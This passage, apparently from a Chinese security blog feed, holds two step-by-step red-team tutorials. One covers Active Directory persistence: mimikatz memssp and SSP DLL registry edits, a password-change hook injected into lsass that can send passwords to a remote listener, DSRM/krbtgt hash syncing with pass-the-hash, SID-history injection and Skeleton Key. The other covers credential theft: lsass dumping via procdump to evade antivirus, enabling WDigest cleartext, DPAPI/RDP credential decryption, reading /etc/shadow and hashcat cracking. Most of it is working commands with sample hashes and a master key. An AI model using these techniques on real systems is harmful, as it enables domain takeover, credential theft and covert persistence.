        <content type="html"><![CDATA[<h1 id="内网权限维持-一-SSP-amp-HOOK-amp-DSRM-amp-SIDhistory-amp-SkeletonKey"><a href="#内网权限维持-一-SSP-amp-HOOK-amp-DSRM-amp-SIDhistory-amp-SkeletonKey" class="headerlink" title="内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey"></a>内网权限维持(一)-SSP&amp;HOOK&amp;DSRM&amp;SIDhistory&amp;SkeletonKey</h1><p>参考链接:<a href="https://www.cnblogs.com/lcxblogs/p/14216525.html">https://www.cnblogs.com/lcxblogs/p/14216525.html</a></p><h2 id="基于验证DLL加载-SSP"><a href="#基于验证DLL加载-SSP" class="headerlink" title="基于验证DLL加载-SSP"></a>基于验证DLL加载-SSP</h2><p>SSP—Security Support Provider，直译为安全支持提供者，又名 Security Package。简单的理解为 SSP 就是一个 DLL，用来实现身份认证，并且维持系统权限</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用mimikatz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">misc::<span class="variable constant_">memssp</span></span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667350515943-7c325332-5ff9-4bb5-b6d9-b89cf5dca409.png" alt="image.png"><br>该命令会在<code>C:\Windows\System32\mimilsa.log</code>记录登录的账号密码(只用在用户注销然后登录后才会记录)<br><img src="/posts/b140a792/1667350574050-440abd5d-5570-48fc-9a0b-3a56b0a76782.png" alt="image.png"><br><strong>如果域控制器重启，被注入内存的伪造的SSP将会丢失。</strong></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>1、把mimkatz中的mimilib.dll传到目标域控的<code>C:\windows\system32\</code>目录下<br><img src="/posts/b140a792/1667351283948-a44c5d36-faba-42dc-a157-2e470f4ffa70.png" alt="image.png"><br>2、修改注册表，重启生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前注册表中的设置值</span></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改注册表中的值</span></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667351501754-d65dfcc4-f9e2-4755-837e-1fd96aa47e6b.png" alt="image.png"><br>命令执行完成后会在注册添加一个mimilib也就是会调用mimilib.dll，<code>\0</code>是换行<br>重启生效后会在<code>C:\windows\system32\kiwissp.log</code> 记录账号密码文件<br><img src="/posts/b140a792/1667351845538-20b58b9a-a75a-4a76-9e3e-22c736f070f6.png" alt="image.png"><br><strong>使用此方法即使系统重启，也不会影响到持久化的效果，但是使用该方法生效想要先重启一下</strong><br>攻防实战中，靶机很难会重启，攻击者重启的话风险过大<br>因此可以在靶机上把两个方法相互结合起来使用效果比较好，<br>有可能存在文件无法读取的情况，可以尝试利用把生成的日志密码文件共享或者发送到内网被控机器或者临时邮箱。</p><h2 id="基于验证DLL加载-HOOK"><a href="#基于验证DLL加载-HOOK" class="headerlink" title="基于验证DLL加载-HOOK"></a>基于验证DLL加载-HOOK</h2><p>Hook PasswordChangeNotify 的作用是当用户修改密码后在系统中进行同步<br><a href="https://github.com/clymb3r/Misc-Windows-Hacking">本地版HookPasswordChange</a><br><a href="https://github.com/wh0Nsq/HookPasswordChange">远程版HookPasswordChange</a><br><a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">HookPasswordChangeNotify.ps1</a></p><h3 id="本地版"><a href="#本地版" class="headerlink" title="本地版"></a>本地版</h3><p>这里用的是本地版的HookPasswordChange<br><img src="/posts/b140a792/1667353983435-59412f54-815f-43bc-a0bb-177c8f6417a8.png" alt="image.png"><br>密码保存在红框中的目录<br>编译时记得修改属性<br><img src="/posts/b140a792/1667353774267-40c4b820-66b6-4b2a-9f71-272784bbbf74.png" alt="image.png"><br>生成后和<code>HookPasswordChangeNotify.ps1</code>放在一起<br><img src="/posts/b140a792/1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f22.png" alt="image.png"><br>在<code>HookPasswordChangeNotify.ps1</code>最后添加一行代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEPath</span> HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311f.png" alt="image.png"><br>该powershell脚本最后会调用刚才生成的dll文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure><p>当用户修改密码时,新的密码就会记录在<code>C:\Windows\Temp\passwords.txt</code><br><img src="/posts/b140a792/1667356354865-4a02e69c-20de-4d60-a026-10c2a74f9c89.png" alt="image.png"></p><h3 id="远程版"><a href="#远程版" class="headerlink" title="远程版"></a>远程版</h3><p>同样是将密码保存到指定目录<br><img src="/posts/b140a792/1667357762746-acd8059e-567f-4895-a7a2-5b4d961dd1be.png" alt="image.png"><br>但是该代码还可以将数据发送到远程服务器<br><img src="/posts/b140a792/1667358075087-f6fc50d7-4960-43e3-952c-7c721d389f28.png" alt="image.png"><br>调用dll会将密码发送值指定地址端口<br>生成后和<code>HookPasswordChangeNotify.ps1</code>放在一起<br><img src="/posts/b140a792/1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f22.png" alt="image.png"><br>在<code>HookPasswordChangeNotify.ps1</code>最后添加一行代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-ReflectivePEInjection</span> <span class="literal">-PEPath</span> HookPasswordChange.dll –procname lsass</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311f.png" alt="image.png"><br>该powershell脚本最后会调用刚才生成的dll文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure><p>同样也是修改密码时触发<br>接受端主机开启nc监听<br><img src="/posts/b140a792/1667358241717-5d6d3281-3a4d-4644-b646-db1621e14283.png" alt="image.png"></p><h2 id="基于机制账号启用-DSRM"><a href="#基于机制账号启用-DSRM" class="headerlink" title="基于机制账号启用-DSRM"></a>基于机制账号启用-DSRM</h2><p>DSRM（Diretcory Service Restore Mode，目录服务恢复模式）是windows域环境中域控制器的安全模式启动选项。域控制器的本地管理员账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改。DSRM的用途是：允许管理员在域环境出现故障时还原、修复、重建活动目录数据库。通过在DC上运行ntdsutil 工具可以修改DSRM密码。<br><strong>1.获取dsrm及krbtgt的NTLM hash</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch /name:krbtgt</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667373372785-66ab461c-b711-4e7e-8b65-33ec9c832e99.png" alt="image.png"><br><img src="/posts/b140a792/1667373433051-e8d8d319-8051-4da6-ab42-10f6dc879db3.png" alt="image.png"><br>krbtgt是Kerberos认证中的用户,获得该用户hash我们就可以随时登录<br><strong>2.dsrm&amp;krbtgt&amp;NTLM hash同步</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入ntdsutil</span></span><br><span class="line">ntdsutil</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改DSRM的密码</span></span><br><span class="line">set DSRM password</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使DSRM的密码和指定域用户的密码同步 eg:<span class="built_in">sync</span> from domain account [域用户名]</span></span><br><span class="line">sync from domain account krbtgt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">退出</span></span><br><span class="line">按两次q即可退出(第1次：退出DSRM密码设置模式;第2次退出ntdsutil)</span><br></pre></td></tr></table></figure><p>如果出现以下报错<br><img src="/posts/b140a792/1667374219233-9837657a-bd24-4df5-8b70-9eacacdbd5e7.png" alt="image.png"><br>说明krbtgt用户未启用到域管理修改用户即可<br><img src="/posts/b140a792/1667374276063-7d7f2d89-3800-4d70-979e-70785814423a.png" alt="image.png"><br><img src="/posts/b140a792/1667374398041-6507c920-0fa4-429f-b3fe-11a53d8cf1fb.png" alt="image.png"><br>该操作将dsrm的hash和krbtgt保持同步<br><strong>3.修改dsrm登录方式</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#powershel执行</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;hklm:\system\currentcontrolset\control\lsa\&quot;</span> <span class="literal">-name</span> <span class="string">&quot;dsrmadminlogonbehavior&quot;</span> <span class="literal">-value</span> <span class="number">2</span> <span class="literal">-propertyType</span> DWORD</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667374637838-263a01cb-ff78-4518-ada0-1329d6ad6896.png" alt="image.png"><br>dsrmadminlogonbehavior代表的是DSRM有三种登录方式</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li></ul><p><strong>4.利用PTH传递攻击</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">sekurlsa::<span class="variable constant_">pth</span> /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed97495408e1537f706c357fc5</span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667375351218-0c652b73-75c3-45cc-9860-0b6780b4f6dd.png" alt="image.png"><br>使用该方法会弹出一个cmd会话，在实战中不现实，可以利用impacket套件中的工具进行pth攻击(而且mimiaktz的使用也需要高权限)<br>利用系统自带机制模式DSRM，修改DSRM默认登录方式和属性，通过其同步krgtgt进行PTH攻击，实现持续化控制，但适用于系统&#x3D;&gt;windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p><h2 id="基于用户属性修改-SID-history"><a href="#基于用户属性修改-SID-history" class="headerlink" title="基于用户属性修改-SID-history"></a>基于用户属性修改-SID-history</h2><p>SID即安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。<br>SIDHistory属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户zhangsan在A域中本来是管理员，迁移到B域的时候因为sid的改变有可能会变成普通用户权限，这时候如果给zhangsan用户添加一个值为zhangsan在A域中的SID的SIDHistory值就可以解决这个问题，只有域管有更改SIDHistory的权利。<br><strong>1、获取所有用户的sid值</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667362625761-fa2f73cb-c13c-489c-8c13-b36806410346.png" alt="image.png"><br>可以发现只有后四位不同而且前几个为三位，这里的sid就代表了权限不同<br><strong>2、获取某用户SID属性</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">Get-ADUser</span> webadmin <span class="literal">-Properties</span> sidhistory</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667363254781-138b97f3-8e87-425a-91a0-92b05418d3c7.png" alt="image.png"><br><strong>3、给予某用户administrator属性</strong><br>利用mimikatz</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">sid::<span class="variable constant_">patch</span></span><br><span class="line">sid::<span class="variable constant_">add</span> /sam:webadmin /<span class="keyword">new</span>:administrator</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667363371676-cb934d84-dad9-450e-b5f9-b05f10654133.png" alt="image.png"><br><img src="/posts/b140a792/1667363465067-4af7a106-0b73-4a96-899a-debc69f75e2a.png" alt="image.png"><br><strong>4、测评给与前后的DC访问权限：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\<span class="number">192.168</span>.<span class="number">3.21</span>\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667363567346-48abf6b1-11d6-4dee-815d-e0f6e108e032.png" alt="image.png"><br>该方法是把域控管理员的SID加入到其他某个恶意的域账户的SID History中，然后，这个恶意的（我们自己创建的）域账户就可以以域管理员权限访问域控了，<strong>不修改域账户则一直存在</strong>。</p><h2 id="基于登录进程劫持-Skeleton-Key"><a href="#基于登录进程劫持-Skeleton-Key" class="headerlink" title="基于登录进程劫持-Skeleton-Key"></a>基于登录进程劫持-Skeleton-Key</h2><p><strong>1、测试域内某个用户与DC通讯</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p>无法成功<br><strong>2、连接DC后，DC注入lsass进程</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\192.168.3.21\<span class="title">ipc</span>$ &quot;<span class="title">Admin12345</span>&quot; /<span class="title">user</span>:<span class="title">god</span>\<span class="title">administrator</span></span><br></pre></td></tr></table></figure><p>域控利用mimikatz：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::<span class="variable constant_">debug</span></span><br><span class="line">misc::<span class="variable constant_">skeleton</span></span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667359196390-7b02efa4-6c40-42c9-ba56-fa558ce59bc8.png" alt="image.png"><br><strong>3、重新测试域内某个用户与DC通讯</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">use</span> \\<span class="title">owa2010cn</span>-<span class="title">god</span>\<span class="title">ipc</span>$ &quot;<span class="title">mimikatz</span>&quot; /<span class="title">user</span>:<span class="title">god</span>\<span class="title">administrator</span></span><br><span class="line"><span class="title">dir</span> \\<span class="title">owa2010cn</span>-<span class="title">god</span>\<span class="title">c</span>$</span><br></pre></td></tr></table></figure><p><img src="/posts/b140a792/1667359246554-20bf3daa-dc4d-4ecb-9edd-af21cd3329aa.png" alt="image.png"><br>原来的密码不受影响也是可以使用的<br><img src="/posts/b140a792/1667359281523-f15d4cac-80b7-49a7-ba6a-40bbb086705a.png" alt="image.png"><br>因为Skeleton Key技术是被注入到lsass.exe进程的，<strong>所以它只存在内存中，如域控重启，万能密码将失效</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网明文密码获取</title>
      <link href="/posts/1ee33d13/"/>
      <url>/posts/1ee33d13/</url>
      
        <content type="html"><![CDATA[<h1 id="内网明文密码获取"><a href="#内网明文密码获取" class="headerlink" title="内网明文密码获取"></a>内网明文密码获取</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><h3 id="1、Windows-Mimikatz适用环境"><a href="#1、Windows-Mimikatz适用环境" class="headerlink" title="1、Windows-Mimikatz适用环境"></a>1、Windows-Mimikatz适用环境</h3><p>微软为了防止明文密码泄露发布了补丁KB2871997，关闭了Wdigest功能。<br>当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，<br>此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。</p><h3 id="2、Linux-mimipenguin适用环境"><a href="#2、Linux-mimipenguin适用环境" class="headerlink" title="2、Linux-mimipenguin适用环境"></a>2、Linux-mimipenguin适用环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Kali 4.3.0 (rolling) x64 (gdm3)</span><br><span class="line">Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</span><br><span class="line">Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</span><br><span class="line">XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)</span><br><span class="line">VSFTPd 3.0.3-8+b1 (Active FTP client connections)</span><br><span class="line">Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) </span><br><span class="line">openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)</span><br></pre></td></tr></table></figure><h2 id="Windows-密码获取-在线离线读取-amp-密文破解-amp-存储凭证"><a href="#Windows-密码获取-在线离线读取-amp-密文破解-amp-存储凭证" class="headerlink" title="Windows-密码获取-在线离线读取&amp;密文破解&amp;存储凭证"></a>Windows-密码获取-在线离线读取&amp;密文破解&amp;存储凭证</h2><h3 id="1、在线读"><a href="#1、在线读" class="headerlink" title="1、在线读"></a>1、在线读</h3><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><h3 id="2、离线读"><a href="#2、离线读" class="headerlink" title="2、离线读"></a>2、离线读</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><h4 id="实验1：针对防护拦截-Mimikatz被拦截"><a href="#实验1：针对防护拦截-Mimikatz被拦截" class="headerlink" title="实验1：针对防护拦截(Mimikatz被拦截)"></a>实验1：针对防护拦截(Mimikatz被拦截)</h4><p>Procdump是微软官方的工具，可在命令行将lsass导出且杀软不会拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666491378838-33df2bb5-7abb-485a-95ba-d45e616ec7dc.png" alt="image.png"><br>把文件下载到本地然后利用mimikatz读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666491778645-5068cfc2-dc72-4cd2-bc93-b988076075af.png" alt="image.png"><br>将读取到的属性还原</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666491807622-e6533bed-63d7-4dee-a3a9-475beaccabae.png" alt="image.png"><br>但是还是读不到明文密码 但是可以解决mimikatz被杀软拦截的情况</p><h4 id="实验2：针对高版本但有存储-内存还有数据的"><a href="#实验2：针对高版本但有存储-内存还有数据的" class="headerlink" title="实验2：针对高版本但有存储(内存还有数据的)"></a>实验2：针对高版本但有存储(内存还有数据的)</h4><p>如果对方存储了密码那么也是可以读到的<br><img src="/posts/1ee33d13/1666492025008-42466061-cab1-4080-bfb9-b473ee7d704d.png" alt="image.png"><br>模拟域控登录<br>利用Procdump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>依旧是拖到本地mimikatz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666492205984-aa2dcb0e-406f-449b-b55c-a1b69d201e06.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666492176215-1d043895-c98c-4c0a-a3d7-321111520a85.png" alt="image.png"><br>成功读取到刚才输入的密码</p><h3 id="3、解决高版本"><a href="#3、解决高版本" class="headerlink" title="3、解决高版本"></a>3、解决高版本</h3><p>修改注册表+强制锁屏+等待系统管理员重新登录+截取明文密码<br>修改注册表来让Wdigest Auth保存明文口令方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666492746064-c16bce42-9fcc-416e-91f8-52b81ed278e4.png" alt="image.png"><br>然后将机器锁屏重新登录<br>再次抓取密码<br><img src="/posts/1ee33d13/1666492888792-474bb70b-f643-4a21-a623-14d251cae28c.png" alt="image.png"><br>成功拿到</p><h3 id="4、HASH破解"><a href="#4、HASH破解" class="headerlink" title="4、HASH破解"></a>4、HASH破解</h3><p>md5在线破解<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><a href="https://www.somd5.com/">https://www.somd5.com/</a><br><img src="/posts/1ee33d13/1666493097652-b3385473-2e75-4ec3-a2c9-05a3578288c5.png" alt="image.png"><br>hashcat工具利用<br><a href="https://hashcat.net/hashcat/">https://hashcat.net/</a>|<br><a href="https://www.cnblogs.com/Junglezt/p/16044372.html">https://www.cnblogs.com/Junglezt/p/16044372.html</a><br><a href="https://blog.csdn.net/weixin_50464560/article/details/120578225">https://blog.csdn.net/weixin_50464560&#x2F;article&#x2F;details&#x2F;120578225</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-m 密文类型</span><br><span class="line">-a 破解类型</span><br><span class="line">?l 小写</span><br><span class="line">?s 符号</span><br><span class="line">?d 数字</span><br></pre></td></tr></table></figure><p>字典破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -a 0 -m 1000 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666493494290-cd044a5f-c0ae-476b-832e-d112bc698548.png" alt="image.png"><br>暴力破解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c ?l?l?l?l?l?s?s?s?d?d</span><br></pre></td></tr></table></figure><p>破解速度取决与电脑性能</p><h3 id="5、RDP凭据抓取"><a href="#5、RDP凭据抓取" class="headerlink" title="5、RDP凭据抓取"></a>5、RDP凭据抓取</h3><p><img src="/posts/1ee33d13/1666505155984-21e55c74-0604-407d-9be3-768adb250bc8.png" alt="image.png"><br>需要保存才可以利用<br>查看连接记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666505429814-4b094d15-0f58-4393-a364-81fa646e2697.png" alt="image.png"><br>查找本地的Credentials：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666505447128-b0207acd-2468-4480-96a9-2bd0fdc72be6.png" alt="image.png"><br>Credentials记录guidMasterKey值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666505563657-b0f19372-4cd5-4d45-96a6-14e0c7d75907.png" alt="image.png"><br>找到guidMasterKey对应的MasterKey:（需要system会话）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666505699205-d6fa02a1-c282-42d9-8816-6e5cc7debcdb.png" alt="image.png"><br>解密指定的MasterKey凭据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\<span class="built_in">local</span>\microsoft\credentials\[Credentials] /masterkey:[MasterKey]</span></span><br><span class="line">mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B /masterkey:69d18472f65ddf5a670ee2c87dd49336f8cc8ccd01e0c6ba8948555636486c967acd2c46490105913a130289c7cf7fb8af72441fe9c02dfe981b2293337267fd</span><br></pre></td></tr></table></figure><p><img src="/posts/1ee33d13/1666506050048-afb4944a-ccdc-4f8a-8ae6-0148a6c2e086.png" alt="image.png"><br>成功解密</p><h2 id="Linux-密码获取-内存读取-amp-密文破解-amp-存储凭证"><a href="#Linux-密码获取-内存读取-amp-密文破解-amp-存储凭证" class="headerlink" title="Linux-密码获取-内存读取&amp;密文破解&amp;存储凭证"></a>Linux-密码获取-内存读取&amp;密文破解&amp;存储凭证</h2><h3 id="1、密码读取"><a href="#1、密码读取" class="headerlink" title="1、密码读取"></a>1、密码读取</h3><p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 ./mimipenguin.sh</span><br><span class="line">./mimipenguin.sh</span><br></pre></td></tr></table></figure><h3 id="2、密码破解"><a href="#2、密码破解" class="headerlink" title="2、密码破解"></a>2、密码破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt</span><br></pre></td></tr></table></figure><p>加密形式：<br>linux sha512crypt $6$, SHA512 (Unix)加密方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 sha512linux.txt p.txt</span><br></pre></td></tr></table></figure><p>linux sha256crypt $5$, SHA256 (Unix)加密方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 7400 sha256linux.txt p.txt</span><br></pre></td></tr></table></figure><p>linux下md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)加密方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 500 linuxmd5.txt p.txt</span><br></pre></td></tr></table></figure><p>inux下bcrypt $2*$, Blowfish加密方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 linuxmd5.txt p.txt</span><br></pre></td></tr></table></figure><h3 id="3、密码存储"><a href="#3、密码存储" class="headerlink" 